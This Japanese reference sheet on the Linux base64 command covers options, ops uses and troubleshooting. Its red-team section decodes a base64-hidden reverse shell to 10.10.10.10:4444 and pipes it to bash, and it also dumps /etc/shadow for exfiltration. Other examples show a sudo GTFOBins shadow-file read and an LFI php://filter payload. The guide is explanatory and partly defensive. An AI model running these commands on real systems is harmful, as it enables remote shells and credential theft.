# Command - Linux - base64 - バイナリデータのテキスト変換（エンコード/デコード）

## 概要

`base64` は、バイナリデータを 64 種類の印字可能文字（A-Z, a-z, 0-9, +, /）のみを使用してテキスト形式に変換（エンコード）、またはその逆（デコード）を行うコマンドです。

(出自: `coreutils` パッケージに含まれる。RFC 4648 準拠)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| `uuencode` | 古いUnixシステムで使用されていた方式。現在は base64 が主流。 | 互換性維持のみ |
| `openssl base64` | OpenSSLの機能として提供。挙動はほぼ同じだが、数行ごとに改行が入る。 | OpenSSL環境下 |
| `python3 -m base64` | Pythonがインストールされていれば、OSを問わず利用可能。 | マルチプラットフォーム |

## よく連携されるコマンド

### シナリオ例: 証明書やバイナリの環境変数への埋め込み (運用視点)

* **目的**: Docker や Kubernetes の Secrets など、テキストしか扱えない場所にバイナリ（SSH鍵や画像など）を保存する。
* **連携コマンド**: `cat`, `echo`
* **解説**: ファイルを base64 文字列に変換してコピーし、使用する側でデコードして元に戻します。
* **コマンド例**:
    ```bash
    # ファイルを base64 化してクリップボードへ (改行なし)
    cat my_key.pem | base64 -w 0
    ```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **基本操作** | |
| ⭐️ `-d`, `--decode` | データをデコード（元に戻す）する。 |
| ⭐️ `-w <cols>`, `--wrap` | 出力の際に指定した文字数で改行を入れる。`0` を指定すると改行を無効化する。 |
| `-i`, `--ignore-garbage` | デコード時に非アルファベット文字（改行など）を無視する。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 設定ファイル（YAML等）へのバイナリデータ埋め込み。
* **組み合わせ**: `-w 0`
* **解説**: YAML ファイルなどに貼り付ける際、途中で改行が入るとパースエラーになるため、改行を抑制します。
* **例**:
    ```bash
    # 画像ファイルを1行の文字列に変換
    base64 -w 0 logo.png > logo.txt
    ```

### 2. ブルーチーム視点

* **タスク**: 難読化された悪意あるスクリプトの解析。
* **組み合わせ**: `-d`
* **解説**: 攻撃者は WAF や IDS を回避するために、ペイロードを base64 でエンコードすることがあります。ログに残された怪しい文字列をデコードして中身を確認します。
* **例**:
    ```bash
    # ログに見つかった怪しい文字列をデコード
    echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=" | base64 -d
    ```

### 3. レッドチーム視点

* **タスク**: データの隠密な持ち出し（Data Exfiltration）および Web シェル実行。
* **組み合わせ**: `echo ... | base64 -d | bash`
* **解説**: 侵入先のサーバから機密ファイルをテキストとして画面上に表示させたり、コマンド自体を隠蔽して実行したりします。
* **例**:
    ```bash
    # リバースシェルを base64 で隠して実行 (IDS 回避)
    echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=" | base64 -d | bash
    
    # ターゲットのファイルを base64 化して画面に出力 (コピペで持ち出す)
    base64 /etc/shadow
    ```

## エラーメッセージとトラブルシューティング

1.  **エラーメッセージ例 1**: `base64: invalid input`
    * **考えられる原因**: デコードしようとした文字列が Base64 の規格に合っていない（不正な文字が含まれている、パディング `=` が足りないなど）。
    * **解決策**: 入力データの欠落がないか確認する。または `-i` オプションでゴミを無視してみる。

2.  **エラーメッセージ例 2**: `base64: invalid option -- 'D'`
    * **考えられる原因**: OS（特に macOS の BSD 版）によってオプションが異なる。
    * **解決策**: macOS では `-d` の代わりに `-D` (大文字) を使う必要がある場合があります。

## 環境変数と設定ファイル

* `base64` は特定の環境変数や設定ファイルを持ちません。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: それ自体に脆弱性はありませんが、**「検知を遅らせる手段」**として悪用されます。
* **悪用シナリオ**:
    * PowerShell や Bash のワンライナーをエンコードして、キーワード検知を回避する。
    * `php://filter/read=convert.base64-encode/resource=config.php` のように、LFI（Local File Inclusion）脆弱性と組み合わせてソースコードを盗み出す。

### GTFOBins における利用例

`base64` はファイルを読み込む機能があるため、`sudo` 権限がある場合、本来アクセスできないファイル（`/etc/shadow` 等）を読み取ることができます。

* **機能**: `File Read`, `Sudo`
* **コマンド例**:
    ```bash
    # sudo を使って特権ファイルを base64 で読み取る
    LFILE=/etc/shadow
    sudo base64 "$LFILE" | base64 --decode
    ```
* **参照**: `https://gtfobins.github.io/gtfobins/base64/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: EDR や SIEM で、コマンドライン引数に含まれる長い base64 文字列を検知対象にする。
* **Detection (検知)**: `base64 -d | bash` や `eval(base64_decode(...))` といった「デコード直後の実行」パターンを厳重に監視する。

## 注意点・補足

* **サイズの変化**: base64 エンコードを行うと、元のバイナリデータよりもサイズが **約 33% 増加** します。巨大なファイルを転送する際は注意が必要です。
* **セキュリティ**: base64 は単なる「エンコード（変換）」であり、**「暗号化」ではありません**。誰でも簡単にデコードできることを忘れないでください。
